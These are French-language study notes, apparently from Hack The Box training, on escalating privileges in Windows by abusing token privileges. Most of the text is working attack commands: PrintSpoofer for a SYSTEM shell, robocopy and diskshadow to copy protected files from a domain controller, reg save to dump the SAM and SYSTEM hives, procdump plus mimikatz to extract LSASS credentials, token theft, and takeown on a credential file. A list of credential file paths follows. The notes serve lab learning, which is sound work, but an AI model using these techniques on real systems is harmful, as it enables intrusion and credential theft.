
[Groupes et usagers par défaut](https://ss64.com/nt/syntax-security_groups.html)
[Groupes et comptes privilégiés](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)

## Privilèges utiles:
* SeImpersonatePrivilege
* SeBackupPrivilege
* SeAssignPrimaryToken
* SeLoadDriver
* SeDebug
## Comptes utiles:
* LOCAL SERVICE
* NETWORK SERVICE
* SERVICE

# named pipes
Méthode de communication local ou distante inter-processus. Crée un fichier dans lequel la communication se déroule.
* Forcer un processus avec privilèges suffisants à se connecter sur un named pipe avec **SeImpersonatePrivilege**

```powershell
pipelist.exe /accepteula
gci \\.\pipe\
#DACL du pipe
accesschk.exe /accepteula \pipe\lsass -v
```
## SeImpersonatePrivilege
### Printspoofer
https://github.com/itm4n/PrintSpoofer
Vérifier que le service roule avant: ```Get-Service Spooler```
vérifier que le pipe ```\\.\pipe\spoolss``` est ouvert: ```(get-childitem \\.\pipe\).FullName```

```
.\printspoofer.exe -i -c cmd
```

Potato (RottenPotato, SweetPotato, Juicy Potato)
https://jlajara.gitlab.io/Potatoes_Windows_Privesc

## SeBackupPrivilege
* Ne peut être utilisé si groupe ou usagé explicitement exclu d'un dossier/fichier
* [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) doit être activé par programmation. 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege

dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
`robocopy /b` peut le faire
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
robocopy "\\DC01\C$\users" "C:\users\backupdc012" /lev:5 /s /b
robocopy "\\DC01\C$\users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell" "C:\users\adminpowershell" /lev:5 /s /b
#Autre version
robocopy /B /S C:\Users\Administrator .\admin
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
On peut éditer les privilèges en copiant tout les policies sur notre machine, éditer puis renvoyer
Doit pouvoir mettre à jour les policies ou redémarrer le PC.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
robocopy "\\DC01\C$\Windows\SYSVOL" ".\SYSVOL" /e /b
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Voir sur internet, pas encore réussi
`diskshadow.exe` aussi
```powershell-session
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

Ce privilège permet aussi de sauvegarder SAM et SYSTEM registry hives
```cmd-session
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
## SeDebugPrivilege
### Extraire la mémoire de LSASS
* Gestionnaire de tâche > Details > lsass.exe > create dump file
*  `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
Utiliser mimikatz
1. `sekurlsa::minidump lsass.dmp`
2. `sekurlsa::logonpasswords`
### Voler un jeton
Chercher le PID d'un processus SYSTEM et utiliser ce [script](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
`[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`

## SeTakeOwnershipPrivilege
Peut être possédé mais pas actif par défaut. Peut être activé avec ce [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)

```powershell-session
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
fichiers utiles
```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

## DNSAdmin